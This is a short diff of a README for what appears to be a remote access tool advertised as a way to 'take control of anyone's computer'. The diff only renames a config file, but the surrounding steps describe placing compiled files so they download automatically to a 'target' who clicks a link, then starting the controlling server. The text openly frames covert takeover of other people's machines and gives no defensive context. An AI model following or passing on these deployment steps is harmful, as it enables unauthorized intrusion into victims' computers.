@@ -12,7 +12,7 @@ Take control of anyone's computer like it's non of your buisness, because it is 
 
 4) place both compiled files in the Windows folder you created ealiar, these files will be automatically downloaded to your target when they click the link.
 
-5) open server_config.cfg and change the server and port to what you want the server to run on.
+5) open server.cfg and change the server and port to what you want the server to run on.
 
 6) run server.py using " python server.py " or " python3 server.py " from the commandline.
 
